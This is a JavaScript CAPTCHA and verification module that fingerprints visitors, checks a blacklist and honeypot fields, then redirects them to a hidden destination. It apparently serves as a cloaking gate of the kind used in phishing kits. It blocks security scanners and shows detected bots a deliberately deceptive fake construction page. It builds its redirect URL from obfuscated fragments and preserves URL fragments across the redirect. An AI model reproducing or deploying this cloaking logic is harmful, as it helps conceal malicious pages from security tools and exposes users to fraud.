/**
 * Enhanced CAPTCHA Module
 * 
 * Provides advanced CAPTCHA verification and challenge handling
 * IMPROVED: Better user experience and fallback mechanisms
 */

// Store verification state
const verification = {
    recaptchaPassed: false,
    fingerprintVerified: false,
    environmentVerified: false
};

// Store user interaction tracking
let interactionData = null;

// NEW: User experience tracking
const userExperience = {
    startTime: Date.now(),
    interactionCount: 0,
    hasShownError: false,
    retryCount: 0,
    maxRetries: 3
};

/**
 * Initialize all CAPTCHA and verification components
 * IMPROVED: Better error handling and user experience
 */
async function initializeCaptcha() {
    // Start tracking user interactions immediately (happens silently in background)
    interactionData = initializeInteractionTracking();
    
    // NEW: Show a friendly loading message
    
    
    try {
        // First check if current visitor is blacklisted before doing anything else
        if (typeof blacklistSystem !== 'undefined') {
            const blacklistCheck = blacklistSystem.checkBlacklist();
            
            if (blacklistCheck.blocked) {
                // Check if user is blacklisted - STRICT
                console.log('User blacklisted - blocking access');
                hideLoadingMessage();
                showBlockedMessage(blacklistCheck.reason);
                return;
                
                // If botTrapSystem is available, show a construction page instead of blocked message
                // This is more deceptive and prevents the bot from knowing it was detected
                if (typeof botTrapSystem !== 'undefined') {
                    botTrapSystem.showConstructionPage(blacklistCheck.reason);
                    return; // Stop initialization
                } else {
                    // Fallback if botTrapSystem isn't available
                    showBlockedMessage(blacklistCheck.reason);
                    return; // Don't continue initialization for blacklisted visitors
                }
            }
        }
        
        // Generate the browser fingerprint
        showLoadingMessage('Analyzing browser environment...');
        const fingerprint = await generateBrowserFingerprint();
        document.getElementById('browser-fingerprint').value = fingerprint;
        
        // Set challenge timestamp
        document.getElementById('challenge-timestamp').value = Date.now().toString();
        
        // Validate browser environment
        showLoadingMessage('Validating browser compatibility...');
        verification.environmentVerified = validateBrowserEnvironment() && checkBrowserFeatures();
        
        // Check for suspicious patterns in fingerprint
        if (typeof blacklistSystem !== 'undefined' && 
            typeof blacklistSystem.hasTooManySuspiciousPatterns === 'function') {
            
            // Get fingerprint data for suspicious pattern detection
            const fingerprintData = await collectFingerprintComponents();
            
            if (blacklistSystem.hasTooManySuspiciousPatterns(fingerprintData)) {
                // Block suspicious browsers - STRICT
                blacklistSystem.recordFailedAttempt("suspicious_fingerprint");
                showBlockedMessage("suspicious_browser");
                return;
            }
        }
        
        // Initialize form submission handler
        document.getElementById('recaptcha-form').addEventListener('submit', handleFormSubmit);
        
        // Generate dynamic token and store it
        showLoadingMessage('Generating security token...');
        generateSecureToken().then(token => {
            document.getElementById('dynamic-token').value = token;
        });
        
        // Set up reCAPTCHA callback
        window.grecaptcha.ready(function() {
            // Set up callback for when reCAPTCHA is completed
            window.handleRecaptchaSuccess = function() {
                verification.recaptchaPassed = true;
            };
        });
        
        // Hide loading message and show the form
        hideLoadingMessage();
        continueInitialization();
        
    } catch (error) {
        console.error('Error during CAPTCHA initialization:', error);
        hideLoadingMessage();
        showErrorWithRetry('An error occurred during initialization. Please try again.');
    }
}

/**
 * NEW: Show loading message
 * @param {string} message Loading message to display
 */
function showLoadingMessage(message) {
    const loadingDiv = document.getElementById('loading-message') || createLoadingElement();
    loadingDiv.textContent = message;
    loadingDiv.style.display = 'block';
}

/**
 * NEW: Hide loading message
 */
function hideLoadingMessage() {
    const loadingDiv = document.getElementById('loading-message');
    if (loadingDiv) {
        loadingDiv.style.display = 'none';
    }
}

/**
 * NEW: Create loading element
 * @returns {HTMLElement} Loading element
 */
function createLoadingElement() {
    const loadingDiv = document.createElement('div');
    loadingDiv.id = 'loading-message';
    loadingDiv.className = 'loading-message';
    loadingDiv.style.cssText = `
        position: fixed;
        top: 50%;
        left: 50%;
        transform: translate(-50%, -50%);
        background: rgba(0, 0, 0, 0.8);
        color: white;
        padding: 20px;
        border-radius: 8px;
        z-index: 10000;
        font-size: 16px;
        text-align: center;
    `;
    document.body.appendChild(loadingDiv);
    return loadingDiv;
}

/**
 * NEW: Continue initialization after checks
 */
function continueInitialization() {
    // Show the CAPTCHA form
    const captchaSection = document.getElementById('captcha-section');
    if (captchaSection) {
        captchaSection.style.display = 'block';
    }
    
    // Show success message
    
}

/**
 * NEW: Show success message
 * @param {string} message Success message
 */
function showSuccessMessage(message) {
    const successDiv = document.createElement('div');
    successDiv.className = 'success-message';
    successDiv.style.cssText = `
        background: #d4edda;
        color: #155724;
        padding: 12px;
        border-radius: 4px;
        margin-bottom: 20px;
        border: 1px solid #c3e6cb;
        font-size: 14px;
    `;
    successDiv.textContent = message;
    
    const mainContent = document.querySelector('.main-content');
    if (mainContent) {
        mainContent.insertBefore(successDiv, mainContent.firstChild);
        
        // Remove after 5 seconds
        setTimeout(() => {
            if (successDiv.parentNode) {
                successDiv.parentNode.removeChild(successDiv);
            }
        }, 5000);
    }
}

/**
 * NEW: Show suspicious browser message with options
 */
function showSuspiciousBrowserMessage() {
    hideLoadingMessage();
    
    const messageDiv = document.createElement('div');
    messageDiv.className = 'suspicious-browser-message';
    messageDiv.innerHTML = `
        <div style="background: #fff3cd; color: #856404; padding: 20px; border-radius: 8px; border: 1px solid #ffeaa7; margin: 20px 0;">
                            <h3 style="margin-top: 0;">Verification Required</h3>
            <p>We detected some unusual browser characteristics. This could be due to:</p>
            <ul style="text-align: left; margin: 20px 0;">
                <li>Privacy extensions or browser settings</li>
                <li>Corporate network security tools</li>
                <li>VPN or proxy connections</li>
                <li>Accessibility tools or screen readers</li>
            </ul>
            <p><strong>You can still proceed by completing the verification below.</strong></p>
            <div style="margin-top: 20px;">
                <button onclick="proceedWithVerification()" style="background: #007bff; color: white; border: none; padding: 10px 20px; border-radius: 4px; cursor: pointer; margin-right: 10px;">
                    Continue with Verification
                </button>
                <button onclick="contactSupport()" style="background: #6c757d; color: white; border: none; padding: 10px 20px; border-radius: 4px; cursor: pointer;">
                    Contact Support
                </button>
            </div>
        </div>
    `;
    
    const mainContent = document.querySelector('.main-content');
    if (mainContent) {
        mainContent.appendChild(messageDiv);
    }
}

/**
 * NEW: Proceed with verification despite suspicious browser
 */
function proceedWithVerification() {
    // Remove suspicious browser message
    const messageDiv = document.querySelector('.suspicious-browser-message');
    if (messageDiv) {
        messageDiv.remove();
    }
    
    // Continue with normal flow
    continueInitialization();
}

/**
 * NEW: Contact support function
 */
function contactSupport() {
    // Show support contact information
    const supportDiv = document.createElement('div');
    supportDiv.className = 'support-message';
    supportDiv.innerHTML = `
        <div style="background: #e2e3e5; color: #383d41; padding: 20px; border-radius: 8px; border: 1px solid #d6d8db; margin: 20px 0;">
            <h3 style="margin-top: 0;">📧 Contact Support</h3>
            <p>If you're having trouble accessing this page, please contact our support team:</p>
            <ul style="text-align: left; margin: 20px 0;">
                <li><strong>Email:</strong> support@example.com</li>
                <li><strong>Phone:</strong> +1-800-123-4567</li>
                <li><strong>Hours:</strong> Monday-Friday, 9 AM - 5 PM EST</li>
            </ul>
            <p>Please include the following information:</p>
            <ul style="text-align: left; margin: 20px 0;">
                <li>Your browser type and version</li>
                <li>Any privacy extensions you're using</li>
                <li>The error message you're seeing</li>
            </ul>
            <button onclick="location.reload()" style="background: #007bff; color: white; border: none; padding: 10px 20px; border-radius: 4px; cursor: pointer;">
                Try Again
            </button>
        </div>
    `;
    
    const mainContent = document.querySelector('.main-content');
    if (mainContent) {
        mainContent.appendChild(supportDiv);
    }
}

/**
 * Shows blocked message when visitor is blacklisted
 * IMPROVED: More user-friendly with options
 * @param {string} reason Reason for blocking
 */
function showBlockedMessage(reason) {
    // Hide the form
    const form = document.getElementById('recaptcha-form');
    if (form) form.style.display = 'none';
    
    // Show blocked message with options
    const errorContainer = document.createElement('div');
    errorContainer.className = 'blocked-message';
    
    let message = 'Access temporarily restricted. ';
    let details = '';
    
    switch(reason) {
        case 'known_bot':
            message += 'Automated access is not permitted.';
            details = 'If you believe this is an error, please contact support.';
            break;
        case 'security_tool':
            message += 'Certain tools are not permitted.';
            details = 'Please disable any scanning tools and try again.';
            break;
        case 'blacklisted':
            message += 'Your access has been temporarily restricted due to suspicious activity.';
            details = 'This restriction will be automatically lifted in 1 hour.';
            break;
        case 'suspicious_browser':
            message += 'Your browser configuration appears to be using privacy tools that prevent verification.';
            details = 'Please try disabling privacy extensions or contact support for assistance.';
            break;
        default:
            message += 'Please try again later or contact support if you believe this is an error.';
            details = 'We apologize for any inconvenience.';
    }
    
    errorContainer.innerHTML = `
        <div class="blocked-icon">⚠️</div>
        <div class="blocked-text">${message}</div>
        <div class="blocked-details">${details}</div>
        <div class="blocked-actions">
            <button onclick="location.reload()" class="retry-button">Try Again</button>
            <button onclick="contactSupport()" class="support-button">Contact Support</button>
        </div>
    `;
    
    // Add to the page
    const mainContent = document.querySelector('.main-content');
    if (mainContent) {
        mainContent.appendChild(errorContainer);
    }
}

/**
 * NEW: Show error with retry option
 * @param {string} message Error message
 */
function showErrorWithRetry(message) {
    userExperience.hasShownError = true;
    userExperience.retryCount++;
    
    const errorDiv = document.createElement('div');
    errorDiv.className = 'error-with-retry';
    errorDiv.innerHTML = `
        <div style="background: #f8d7da; color: #721c24; padding: 15px; border-radius: 4px; border: 1px solid #f5c6cb; margin: 20px 0;">
            <div style="font-weight: bold; margin-bottom: 10px;">⚠️ Error</div>
            <div style="margin-bottom: 15px;">${message}</div>
            ${userExperience.retryCount < userExperience.maxRetries ? 
                `<button onclick="retryInitialization()" style="background: #dc3545; color: white; border: none; padding: 8px 16px; border-radius: 4px; cursor: pointer;">
                    Try Again (${userExperience.retryCount}/${userExperience.maxRetries})
                </button>` :
                `<button onclick="contactSupport()" style="background: #6c757d; color: white; border: none; padding: 8px 16px; border-radius: 4px; cursor: pointer;">
                    Contact Support
                </button>`
            }
        </div>
    `;
    
    const mainContent = document.querySelector('.main-content');
    if (mainContent) {
        mainContent.appendChild(errorDiv);
    }
}

/**
 * NEW: Retry initialization
 */
function retryInitialization() {
    // Remove error message
    const errorDiv = document.querySelector('.error-with-retry');
    if (errorDiv) {
        errorDiv.remove();
    }
    
    // Reset some state
    userExperience.hasShownError = false;
    
    // Retry initialization
    setTimeout(() => {
        initializeCaptcha();
    }, 1000);
}

/**
 * Handle form submission with all verification checks
 * IMPROVED: Better error handling and user feedback
 * @param {Event} e The submit event
 */
async function handleFormSubmit(e) {
    e.preventDefault();
    
    // Show loading state
    const submitButton = document.getElementById('continue-btn');
    const originalText = submitButton.textContent;
    submitButton.textContent = 'Verifying...';
    submitButton.disabled = true;
    
    try {
        // Double-check reCAPTCHA is valid
        let recaptchaResponse;
        try {
            recaptchaResponse = grecaptcha.getResponse();
            if (recaptchaResponse.length < 1) {
                showFormError('Please complete the reCAPTCHA verification.');
                return;
            }
        } catch (error) {
            console.error("Error getting reCAPTCHA response:", error);
            showFormError('reCAPTCHA verification failed. Please try again.');
            return;
        }
        
        // Check honeypot fields - bots often fill these out (silent check)
        try {
            const honeypotFields = document.querySelectorAll('input[style*="position: absolute"]');
            let honeypotFilled = false;
            
            honeypotFields.forEach(field => {
                if (field.value) {
                    honeypotFilled = true;
                }
            });
            
            if (honeypotFilled) {
                // Record the failed attempt in blacklist system
                if (typeof blacklistSystem !== 'undefined') {
                    blacklistSystem.recordFailedAttempt("honeypot_filled");
                    
                    // Show fake error page to fool the bot
                    if (typeof botTrapSystem !== 'undefined') {
                        botTrapSystem.showConstructionPage("honeypot_triggered");
                        return;
                    }
                }
                
                showFormError('Verification failed. Please try again.');
                return;
            }
        } catch (error) {
            console.error("Error checking honeypot fields:", error);
            // Continue anyway to not block legitimate users
        }
        
        // Simple analytics for interactions - don't block users if this fails
        try {
            const humanInteractions = analyzeInteractions(interactionData);
            if (!humanInteractions && typeof blacklistSystem !== 'undefined') {
                blacklistSystem.recordFailedAttempt("no_interactions");
            }
        } catch (error) {
            console.error("Error analyzing interactions:", error);
            // Continue anyway to not block legitimate users
        }
        
        // Store the token and display loading message
        let token;
        try {
            // Get token from form
            token = document.getElementById('dynamic-token').value;
            
            // Store in localStorage with fallbacks
            try {
                localStorage.setItem('secureToken', token);
                localStorage.setItem('tokenTimestamp', Date.now().toString());
            } catch (storageError) {
                console.warn("LocalStorage not available, continuing without token storage:", storageError);
                // Will bypass token validation in redirect
            }
            
            // Store any URL fragments for preservation during redirect
            const urlFragment = window.location.hash;
            if (urlFragment) {
                try {
                    sessionStorage.setItem('redirectFragment', urlFragment);
                    localStorage.setItem('redirectFragment', urlFragment);
                } catch (fragmentError) {
                    console.warn("Error storing URL fragment:", fragmentError);
                    // Continue anyway
                }
            }
            
            // Show redirect section
            document.getElementById('captcha-section').style.display = 'none';
            document.getElementById('redirect-section').style.display = 'block';
            
            // Trigger redirect with a short delay to allow UI update
            setTimeout(() => {
                if (typeof redirectToProtectedContent === 'function') {
                    redirectToProtectedContent(token);
                } else {
                    // Fallback redirect if function not found
                    let destinationUrl = 'https://example.com';
                    if (typeof _u !== 'undefined') {
                        try {
                            // Try to assemble URL from components
                            const p = _u.p;
                            const h = _u.h;
                            const e = _u.e; // Use as-is, do not reverse
                            destinationUrl = p + (h.charAt(0) === '/' ? h : '/' + h) + e;
                        } catch (urlError) {
                            console.error("Error assembling URL:", urlError);
                            // Use fallback URL
                        }
                    }
                    
                    // Append fragment if exists
                    if (urlFragment) {
                        if (destinationUrl.includes('#')) {
                            destinationUrl = destinationUrl.split('#')[0] + urlFragment;
                        } else {
                            destinationUrl += urlFragment;
                        }
                    }
                    
                    // Log and perform redirect
                    console.log("Fallback redirect to:", destinationUrl);
                    window.location.href = destinationUrl;
                }
            }, 1000);
        } catch (error) {
            console.error("Error during form submission:", error);
            showFormError('An error occurred. Please try again.');
        }
    } finally {
        // Restore button state
        submitButton.textContent = originalText;
        submitButton.disabled = false;
    }
}

/**
 * NEW: Show form error message
 * @param {string} message Error message
 */
function showFormError(message) {
    const errorElement = document.getElementById('g-recaptcha-error');
    if (errorElement) {
        errorElement.innerHTML = `<span style="color:red;">${message}</span>`;
        
        // Clear error after 5 seconds
        setTimeout(() => {
            errorElement.innerHTML = '';
        }, 5000);
    }
}

// Initialize when the DOM is ready
document.addEventListener('DOMContentLoaded', initializeCaptcha); 